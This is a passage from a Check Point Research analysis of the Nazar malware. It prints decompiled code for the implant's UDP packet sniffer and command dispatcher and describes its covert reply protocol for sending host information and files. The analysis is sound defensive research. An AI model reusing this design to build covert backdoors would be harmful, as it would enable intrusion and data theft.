@@ -1,0 +1,93 @@
+Communication
+https://research.checkpoint.com/2020/nazar-spirits-of-the-past/ 6/22
+5/6/2020 Nazar: Spirits of the Past - Check Point Research
+When analyzing the networking component, the main thing we looked for was the IP of the
+command and control, since this could open up new paths, and perhaps recent attacks and
+samples. Alas, leaving no stone unturned, we could not find such an IP, and it made sense due to
+how Nazar is communicating.
+Upon execution of the service, it begins with setting up the packet sniffing. This is done by using
+the Packet Sniffer SDK, in pretty much a textbook way. The main thread gets an outward-facing
+network adapter and uses BPF to make sure only UDP packets are forwarded to the handler.
+DWORD __stdcall main_thread(LPVOID lpThreadParameter)
+{
+HANDLE hMgr; // edi
+HANDLE hCfg; // esi
+HANDLE hFtr; // edi
+hMgr = MgrCreate();
+MgrInitialize(hMgr);
+hCfg = MgrGetFirstAdapterCfg(hMgr);
+do
+{
+if ( !AdpCfgGetAccessibleState(hCfg) )
+break;
+hCfg = MgrGetNextAdapterCfg(hMgr, hCfg);
+}
+while ( hCfg );
+ADP_struct = AdpCreate();
+AdpSetConfig(ADP_struct, hCfg);
+if ( !AdpOpenAdapter(ADP_struct) )
+{
+AdpGetConnectStatus(ADP_struct);
+MaxPacketSize = AdpCfgGetMaxPacketSize(hCfg);
+adapter_ip = AdpCfgGetIpA_wrapper(hCfg, 0);
+https://research.checkpoint.com/2020/nazar-spirits-of-the-past/ 7/22
+5/6/2020 Nazar: Spirits of the Past - Check Point Research
+AdpCfgGetMACAddress(hCfg, &mac_address, 6);
+hFtr = BpfCreate();
+BpfAddCmd(hFtr, BPF_LD_B_ABS, 23u); // Get Protocol field value
+BpfAddJmp(hFtr, BPF_JMP_JEQ, IPPROTO_UDP, 0, 1);// Protocol == UDP
+BpfAddCmd(hFtr, BPF_RET, 0xFFFFFFFF);
+BpfAddCmd(hFtr, BPF_RET, 0);
+AdpSetUserFilter(ADP_struct, hFtr);
+AdpSetUserFilterActive(ADP_struct, 1);
+AdpSetOnPacketRecv(ADP_struct, on_packet_recv_handler, 0);
+AdpSetMacFilter(ADP_struct, 2);
+while ( 1 )
+{
+if ( stop_and_ping == 1 )
+{
+adapter_ip = AdpCfgGetIpA_wrapper(hCfg, 0);
+connection_method(2);
+stop_and_ping = 0;
+}
+Sleep(1000u);
+}
+}
+return 0;
+}
+Whenever a UDP packet arrives, its source IP is recorded to be used in the next response,
+whether or not there will be a response. Then, the packet’s destination port will be checked, and
+in case it is 1234 the UDP data will be forwarded to the command dispatcher.
+int __cdecl commandMethodsWrapper(udp_t udp_packet, int zero, char src_ip, int ip_id)
+{
+https://research.checkpoint.com/2020/nazar-spirits-of-the-past/ 8/22
+5/6/2020 Nazar: Spirits of the Past - Check Point Research
+int length; // edi
+length = HIBYTE(udp_packet->length) - 8;
+ntohs(udp_packet->src_port);
+if ( ntohs(udp_packet->dst_port) != 1234 )
+return 0;
+commandDispatcher(&udp_packet[1], src_ip, ip_id, length);
+return 1;
+}
+Types of responses
+Each response will have its packet built from scratch, so it could be sent using PSSDK’s send
+methods : AdpAsyncSend/AdpSyncSend
+There are 3 types of responses:
+Send an ACK: With destination port 4000 and payload 101;0000
+Send computer information: With destination port 4000 and payload 100;<Computer
+```
+      Name>;
+                                           --```
+
+Send a file: The content will be sent as UDP data, followed by another packet with
+<size_of_file> The UDP destination port will be the little-endian value of the IP
+identification field in the request message. For example, If the server sent a packet (to
+destination port 1234) with identification 0x3456,the malware will send its response with
+destination port 0x5634
+To make the options clearer, and to demonstrate how Nazar communicates, we have created a
+python script that can “play” the server controlled by the attacker, and communicate with the
+victim. The script is available in Appendix C.
+https://research.checkpoint.com/2020/nazar-spirits-of-the-past/ 9/22
+5/6/2020 Nazar: Spirits of the Past - Check Point Research
+A script we created to demonstrate how the server would communicate with Nazar
